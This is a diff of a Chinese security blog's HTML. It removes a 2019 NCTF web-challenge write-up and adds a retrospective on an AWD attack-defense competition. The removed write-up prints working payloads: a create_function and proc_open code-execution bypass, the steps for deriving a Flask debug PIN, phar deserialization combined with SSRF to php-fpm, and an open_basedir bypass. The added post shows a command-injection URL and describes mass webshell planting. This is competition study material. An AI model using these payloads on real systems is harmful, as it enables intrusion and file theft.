@@ -96,31 +96,27 @@
 
 
 
-  <meta name="description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
+  <meta name="description" content="周末参加了星盟线上awd的比赛，对手都是比较强的队伍，我们一队的是一起参加考核的新人，配合可能还不够默契，导致分工不明确，打起来手忙脚乱，在此做一个总结记录。 开场比赛是从一点开始，五点结束。一点多的时候上了第一道题web2，不知道为什么ssh连不上靶机，正在发愁的时候队友已经把源码下载好了放到群里，下载下来先用D盾扫描了一下。  两个内置后门，一个是登录界面，一个是登录后的index界面。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2019NCTFweb部分复现">
-<meta property="og:url" content="http://yoursite.com/year/11/29/2019NCTF/index.html">
+<meta property="og:title" content="星盟awd复盘">
+<meta property="og:url" content="http://yoursite.com/year/03/16/星盟awd复盘/index.html">
 <meta property="og:site_name" content="Yiyangqianxixxxx">
-<meta property="og:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
+<meta property="og:description" content="周末参加了星盟线上awd的比赛，对手都是比较强的队伍，我们一队的是一起参加考核的新人，配合可能还不够默契，导致分工不明确，打起来手忙脚乱，在此做一个总结记录。 开场比赛是从一点开始，五点结束。一点多的时候上了第一道题web2，不知道为什么ssh连不上靶机，正在发愁的时候队友已经把源码下载好了放到群里，下载下来先用D盾扫描了一下。  两个内置后门，一个是登录界面，一个是登录后的index界面。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png">
-<meta property="og:updated_time" content="2019-12-14T09:46:00.643Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328054298.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328160640.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328169723.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/281.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330479435.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/QQ%E5%9B%BE%E7%89%8720200316114956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330651576.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330745375.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/970000.png">
+<meta property="og:updated_time" content="2020-03-16T04:19:22.483Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="2019NCTFweb部分复现">
-<meta name="twitter:description" content="hackbackdoor 题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。  但是直接用参数拼接的方法比较容易写错，可以使用cre">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png">
+<meta name="twitter:title" content="星盟awd复盘">
+<meta name="twitter:description" content="周末参加了星盟线上awd的比赛，对手都是比较强的队伍，我们一队的是一起参加考核的新人，配合可能还不够默契，导致分工不明确，打起来手忙脚乱，在此做一个总结记录。 开场比赛是从一点开始，五点结束。一点多的时候上了第一道题web2，不知道为什么ssh连不上靶机，正在发愁的时候队友已经把源码下载好了放到群里，下载下来先用D盾扫描了一下。  两个内置后门，一个是登录界面，一个是登录后的index界面。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328054298.png">
 
 
 
@@ -128,7 +124,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/year/11/29/2019NCTF/">
+  <link rel="canonical" href="http://yoursite.com/year/03/16/星盟awd复盘/">
 
 
 
@@ -138,7 +134,7 @@
   };
 </script>
 
-  <title>2019NCTFweb部分复现 | Yiyangqianxixxxx</title>
+  <title>星盟awd复盘 | Yiyangqianxixxxx</title>
   
 
 
@@ -374,7 +370,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/11/29/2019NCTF/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/year/03/16/星盟awd复盘/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Yan">
@@ -391,7 +387,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">2019NCTFweb部分复现
+          <h1 class="post-title" itemprop="name headline">星盟awd复盘
 
               
             
@@ -417,24 +413,12 @@
                 
               
 
-              <time title="创建时间：2019-11-29 08:28:25" itemprop="dateCreated datePublished" datetime="2019-11-29T08:28:25+08:00">2019-11-29</time>
+              <time title="创建时间：2020-03-16 11:00:00 / 修改时间：12:19:22" itemprop="dateCreated datePublished" datetime="2020-03-16T11:00:00+08:00">2020-03-16</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-12-14 17:46:00" itemprop="dateModified" datetime="2019-12-14T17:46:00+08:00">2019-12-14</time>
               
             
           </span>
@@ -451,7 +435,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF复现/" itemprop="url" rel="index"><span itemprop="name">CTF复现</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/总结记录/" itemprop="url" rel="index"><span itemprop="name">总结记录</span></a></span>
 
                 
                 
@@ -470,8 +454,8 @@
                 </span>
             
                 <span class="post-meta-item-text">评论数：</span>
-                <a href="/year/11/29/2019NCTF/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/year/11/29/2019NCTF/" itemprop="commentCount"></span>
+                <a href="/year/03/16/星盟awd复盘/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/year/03/16/星盟awd复盘/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -479,7 +463,7 @@
 
           
           
-            <span id="/year/11/29/2019NCTF/" class="leancloud_visitors" data-flag-title="2019NCTFweb部分复现">
+            <span id="/year/03/16/星盟awd复盘/" class="leancloud_visitors" data-flag-title="星盟awd复盘">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
@@ -504,7 +488,7 @@
                 
                   <span class="post-meta-item-text">本文字数：</span>
                 
-                <span title="本文字数">2.4k</span>
+                <span title="本文字数">1.5k</span>
               
 
               
@@ -518,7 +502,7 @@
                 
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
-                <span title="阅读时长">2 分钟</span>
+                <span title="阅读时长">1 分钟</span>
               
             </div>
           
@@ -538,42 +522,38 @@
       
 
       
-        <a id="more"></a>
-<h3 id="hackbackdoor"><a href="#hackbackdoor" class="headerlink" title="hackbackdoor"></a>hackbackdoor</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126112728.png" alt></p>
-<p>题目要求传入一个code参数，但不能包含php的内置函数，其实很简单，一开始想着用无字母数字webshell打，但是发现好像没用，后来尝试大小写绕过（不知道当时做题的时候为什么不行），后面测试发现可以绕过，可能是当时手误。不过这里学习了一下其他人的解法，用参数赋值然后拼接构成函数，以及proc_open的使用方法。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126113715.png" alt></p>
-<p>但是直接用参数拼接的方法比较容易写错，可以使用create_function创建一个方法，把方法执行的代码内容写在post里，这样比较方便。所以构造url</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:60004/?code=$a=%22create_f%22.%22unction%22;$c=$a(%27%27,$_POST[a]);$c();&amp;useful=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>post内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=$cmd=&apos;../../.././readflag&apos;;</span><br><span class="line">$descriptorspec=array(array(&apos;pipe&apos;,&apos;r&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;) ,array(&apos;pipe&apos;,&apos;w&apos;)</span><br><span class="line">);</span><br><span class="line">$handle=proc_open($cmd, $descriptorspec, $p);</span><br><span class="line">var_dump(stream_get_contents($p[1]));</span><br><span class="line">proc_close($handle);</span><br></pre></td></tr></table></figure>
-<h3 id="flaskwebsite"><a href="#flaskwebsite" class="headerlink" title="flaskwebsite"></a>flaskwebsite</h3><p>这题的知识点之前没有学习过，是有关于flask debug pin码的安全问题。flask在debug模式下会生成一个debugger pin，通过这个pin码可以在报错页面执行任意python代码。这里有篇文章专门讲解了这方面的问题 <a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener">文章链接</a></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126115609.png" alt></p>
-<p>而这个pin码是可以通过搜集机器上的一些信息来生成的，所以配合一个任意文件读取的功能就可以实现代码执行的功能了。所以只要根据文章的内容来提取出需要的信息，就可以构造出题目机器上的pin。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username  #也就是运行当前flask的用户，可以通过etc/passwd来得到</span><br><span class="line"></span><br><span class="line">modname  #flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &apos;__file__&apos;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制/sys/class/net/eth0/address</span><br><span class="line"></span><br><span class="line">get_machine_id() # /etc/machine-id 或 /proc/sys/kernel/random/boot_id</span><br></pre></td></tr></table></figure>
-<p>但这题有一个不一样的点，因为是docker起的服务，所以读机器id没有用，要读docker容器id，通过路径 /proc/self/cgroup来读取</p>
-<p>用脚本跑出来pin然后直接在报错页面执行python代码读文件就行了</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126121939.png" alt></p>
-<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191126123205.png" alt></p>
-<p>第一个num可以用%0a绕过,第二个条件只要string1和string2的md5值是以0e开头，并且内容中 包含cxhp四个字母就可以令他们相等了。第三个条件是要传入的参数q_w_q中不能含有’_’或者url编码后的%57，但是下划线 _可以用.代替，所以传入参数q.w.q。</p>
-<h3 id="phar-matches-everything"><a href="#phar-matches-everything" class="headerlink" title="phar matches everything"></a>phar matches everything</h3><p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128120953.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121139.png" alt></p>
-<p>根据题目提示vim可以想到有.swp文件泄露，测试发现文件catchmine.php.swp，恢复后文件内容如下</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121357.png" alt></p>
-<p>题目意思很明确，就是curl_exec实现任意文件读取，要触发curl必须先满足careful反序列化后执行函数funny_get()得到1，这个很简单，直接构造</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128121602.png" alt></p>
-<p>而Main类要怎么实现反序列化，可以通过getimagesize(phar://文件路径)来触发，所以利用点也就明确了，上传一个phar文件并且类型设置为jpeg或gif，得到上传后的路径填入name中。要任意读取的文件可以通过Main类的url属性来设置。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122058.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128104532.png" alt></p>
-<p>得到一个内网网址10.0.0.3，访问后得到</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128122255.png" alt></p>
-<p>提示10.0.0.3由php-fpm，所以可以想到利用ssrf+gopher</p>
-<p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher" target="_blank" rel="noopener">参考链接</a></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/QQ%E6%88%AA%E5%9B%BE20191128123214.png" alt></p>
-<p>由于这一题的php-fpm在10.0.0.3上，所以要把开头的gopher://127.0.0.1改为gopher://10.0.0.3，而且这题不需要二次url编码。</p>
-<p>后面的内容因为题目环境关了，所以没有截图，只能口诉。</p>
-<p>后面访问phpinfo后会发现禁用了很多函数，而且限制了open_basedir，但是可以绕过，可用php代码为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir(&apos;/tmp/fuck&apos;);chdir(&apos;/tmp/fuck&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(scandir(&apos;/&apos;));readfile(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/YsMnLpUAnOolblXHVfCk8w</a></p>
+        <p>周末参加了星盟线上awd的比赛，对手都是比较强的队伍，我们一队的是一起参加考核的新人，配合可能还不够默契，导致分工不明确，打起来手忙脚乱，在此做一个总结记录。</p>
+<h4 id="开场"><a href="#开场" class="headerlink" title="开场"></a>开场</h4><p>比赛是从一点开始，五点结束。一点多的时候上了第一道题web2，不知道为什么ssh连不上靶机，正在发愁的时候队友已经把源码下载好了放到群里，下载下来先用D盾扫描了一下。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328054298.png" alt></p>
+<p>两个内置后门，一个是登录界面，一个是登录后的index界面。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328160640.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584328169723.png" alt></p>
+<p>修起来很简单，可以直接改成echo一个假flag，队友一开始没修好，注释没注释完全导致打了两轮我才发现我们也还没修这个洞。知道flag在哪之后就开始写批量脚本，因为flag是直接回显在页面之上，所以用re模块直接匹配flag那一行就可以了。这个洞没什么好说的。</p>
+<p>在登录之后有个上传功能，后缀名虽然经过黑名单过滤，但是可以用url二次编码绕过，因为处理文件上传的函数中经过了一次urldecode</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/281.png" alt></p>
+<p>比赛的时候这个exp没来得及打，但是队里的师傅把这个urldecode注释了，后面不知道为啥还是被打了，可能还有别的洞没发现。。。</p>
+<h4 id="web3上线"><a href="#web3上线" class="headerlink" title="web3上线"></a>web3上线</h4><p>web3上来感觉就是给我们硬打的，洞多的一批，修了几个后发现站被人删了。。。就索性找洞慢慢打别人。</p>
+<p>上来队友直接发了个命令执行的点</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330479435.png" alt></p>
+<p>这个直接 ?1=aaa&amp;cat%09/flag&gt;v2.txt  然后读v2.txt就可以了。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/QQ%E5%9B%BE%E7%89%8720200316114956.png" alt></p>
+<p>然后就是htaccess可以解析html md文件</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330651576.png" alt></p>
+<p>入口的md文件readme.md就可以直接执行了，包括上传md文件，html文件都可以执行，这里得修改htaccess。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/1584330745375.png" alt></p>
+<p>这个虽然不知道能不能利用，但是看到eval就不顺眼，注释掉了。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day2/970000.png" alt></p>
+<p>然后是home.php下面的反序列化漏洞，直接构造传参就能任意命令执行了。</p>
+<p>其他的点都没来得及挖，web3就让人删站了。</p>
+<h4 id="web1上线"><a href="#web1上线" class="headerlink" title="web1上线"></a>web1上线</h4><p>这个web1是真无语，因为是黑盒，如果对手先getshell，我们就拿不到自己的站了，我上来看我们的服务就已经给人删站了，跑别人的网站下去看了看，发现了tp5的报错，直接打了发exp发现就成功了，然后写批量利用，奈何好多队都已经修好了，只能打到机器人的分。然后renew了我们的服务，给自己写个shell连上去发现我们的服务器已经写满了不死马。。删都删不完</p>
+<p>然后就只能吃几个机器人的分，能修的洞都修了，但是师傅们的马已经写到服务器上了，用自己写的shell也删不掉，不知道为什么，就等着比赛结束了。</p>
+<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>这次复盘了比赛过程，漏洞点明显，节奏很快 10分钟一轮后面好像5分钟一轮了，分工不明确导致又写exp又审代码还看了下流量，这样其实每个工作都做不好，应该每个人都明确好自己要做的事情，然后有余力的情况下再帮别人分担。</p>
+<p>其次是找到漏洞点，第一时间修复了应该复测一下是否还存在，有可能代码打错了，把服务直接down了。然后写批量拿flag先收掉第一轮的flag，再批量写shell，然后用稳控拿分。这一次光顾着get flag，却不知道写shell稳控。</p>
+<p>被删站后应该第一时间备份上去，把漏洞点修好，然后再处理不死马的问题，不然光check掉的分都能把分掉完，上次省赛就是被人打dos打的服务异常把分掉到了第二名。</p>
+<p>不死马还可以有一种处理方法，就是修改文件夹权限，改成644，这样马没有执行权限。</p>
+<p>流量中快速定位到被拿flag的地方，第一时间应该直接重放流量，写批量，赛后再看漏洞原理。</p>
+<p>脚本应该提前准备好，waf，批量传shell，批量提交flag等等，这次都没用上别人造的轮子，全是自己现场写的，又烂又慢。</p>
+<p>主要还是awd玩的太少了，希望以后可以多学习学习。</p>
 
       
     </div>
@@ -604,8 +584,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/year/11/27/docker日常使用命令记录/" rel="next" title="docker日常使用命令记录">
-                <i class="fa fa-chevron-left"></i> docker日常使用命令记录
+              <a href="/year/03/14/python反序列化漏洞/" rel="next" title="python反序列化漏洞">
+                <i class="fa fa-chevron-left"></i> python反序列化漏洞
               </a>
             
           </div>
@@ -613,10 +593,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/year/12/12/thinkphp合集/" rel="prev" title="thinkphp合集">
-                thinkphp合集 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -752,7 +728,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#hackbackdoor"><span class="nav-number">1.</span> <span class="nav-text">hackbackdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flaskwebsite"><span class="nav-number">2.</span> <span class="nav-text">flaskwebsite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyphp"><span class="nav-number">3.</span> <span class="nav-text">easyphp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-matches-everything"><span class="nav-number">4.</span> <span class="nav-text">phar matches everything</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">5.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#开场"><span class="nav-number">1.</span> <span class="nav-text">开场</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web3上线"><span class="nav-number">2.</span> <span class="nav-text">web3上线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web1上线"><span class="nav-number">3.</span> <span class="nav-text">web1上线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后记"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div>
             
 
           </div>
